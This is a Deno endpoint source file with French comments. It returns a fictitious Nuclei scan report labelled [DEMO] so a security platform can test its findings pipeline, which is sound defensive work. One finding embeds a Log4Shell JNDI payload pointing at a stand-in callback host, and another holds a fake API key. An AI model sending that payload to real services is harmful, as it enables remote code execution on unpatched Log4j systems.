/**
 * get-demo-fixture
 *
 * Retourne un artefact JSON valide représentant un rapport de scan fictif [DEMO].
 * Ce fichier est conçu pour être uploadé via le vrai pipeline :
 *   create-tool-run → upload-tool-run-artifact → normalize-tool-run → findings en DB
 *
 * Il NE contient aucune vraie donnée.
 * Toutes les valeurs sont marquées [DEMO] et sont de la fiction.
 * Ce endpoint est PUBLIC (pas d'auth requise) car le JSON est purement fictif.
 *
 * Multi-tenant : ce endpoint ne touche aucune DB. Il retourne juste un JSON statique.
 */

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const DEMO_FIXTURE = {
  _meta: {
    source: 'cyber-serenity-demo-fixture',
    disclaimer: '[DEMO] Données entièrement fictives - usage pipeline de test uniquement',
    generated_at: new Date().toISOString(),
    tool: 'nuclei',
    version: '3.0.0',
  },
  results: [
    {
      template: 'ssl-expired',
      template_id: 'ssl-expired',
      name: '[DEMO] Certificat TLS expiré détecté',
      severity: 'high',
      host: 'demo-target.example.com',
      ip: '203.0.113.10',
      port: 443,
      protocol: 'https',
      matched: 'certificate expired 2024-01-01',
      description: '[DEMO] Le certificat TLS du serveur web a expiré. Faux positif de démonstration.',
      reference: 'https://owasp.org/www-project-transport-layer-protection-cheat-sheet/',
    },
    {
      template: 'open-port-exposed',
      template_id: 'open-port-exposed',
      name: '[DEMO] Port SSH exposé publiquement',
      severity: 'medium',
      host: 'demo-target.example.com',
      ip: '203.0.113.10',
      port: 22,
      protocol: 'tcp',
      description: '[DEMO] Le port SSH (22) est accessible depuis Internet. Faux positif de démonstration.',
      references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-38408'],
    },
    {
      template: 'secret-in-header',
      template_id: 'secret-in-header',
      name: '[DEMO] Clé API exposée dans les en-têtes HTTP',
      severity: 'critical',
      host: 'api.demo-target.example.com',
      ip: '203.0.113.11',
      matched: 'X-API-Key: sk_live_DEMO_FAKE_KEY_0000000000000000',
      description: '[DEMO] Une clé API fictive est exposée dans les en-têtes de réponse. Faux positif de démonstration.',
      reference: 'https://owasp.org/www-project-api-security/',
      cve: 'CVE-2024-00000',
    },
    {
      template: 'log4shell',
      template_id: 'log4shell-rce',
      name: '[DEMO] Log4Shell (CVE-2021-44228) - Composant de démonstration',
      severity: 'critical',
      host: 'app.demo-target.example.com',
      ip: '203.0.113.12',
      port: 8080,
      matched: '${jndi:ldap://demo-callback.example.com/exploit}',
      description: '[DEMO] Vulnérabilité Log4Shell fictive pour test de pipeline. Pas de vraie infrastructure exposée.',
      references: [
        'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
        'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
      ],
      cve: 'CVE-2021-44228',
      cwe: 'CWE-917',
    },
    {
      template: 'subdomain-takeover',
      template_id: 'subdomain-takeover',
      name: '[DEMO] Sous-domaine abandonné détecté',
      severity: 'high',
      host: 'old.demo-target.example.com',
      description: '[DEMO] Un sous-domaine DNS pointe vers un service Cloud non réclamé. Faux positif de démonstration.',
      matched: 'CNAME: demo.azurewebsites.net (unclaimed)',
    },
    {
      template: 'iac-s3-public',
      template_id: 'aws-s3-public-bucket',
      name: '[DEMO] Bucket S3 accessible publiquement (IaC)',
      severity: 'medium',
      host: 's3.amazonaws.com',
      path: '/demo-bucket-public-fixture',
      description: '[DEMO] Un bucket S3 fictif est configuré en accès public. Faux positif de démonstration.',
    },
  ],
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  if (req.method !== 'GET') {
    return new Response(
      JSON.stringify({ error: 'Method not allowed' }),
      { status: 405, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }

  // Retourner le fixture JSON avec un timestamp frais
  const fixture = {
    ...DEMO_FIXTURE,
    _meta: {
      ...DEMO_FIXTURE._meta,
      generated_at: new Date().toISOString(),
    },
  };

  return new Response(
    JSON.stringify(fixture, null, 2),
    {
      status: 200,
      headers: {
        ...corsHeaders,
        'Content-Type': 'application/json',
        'Content-Disposition': 'attachment; filename="demo-fixture-nuclei.json"',
      },
    }
  );
});
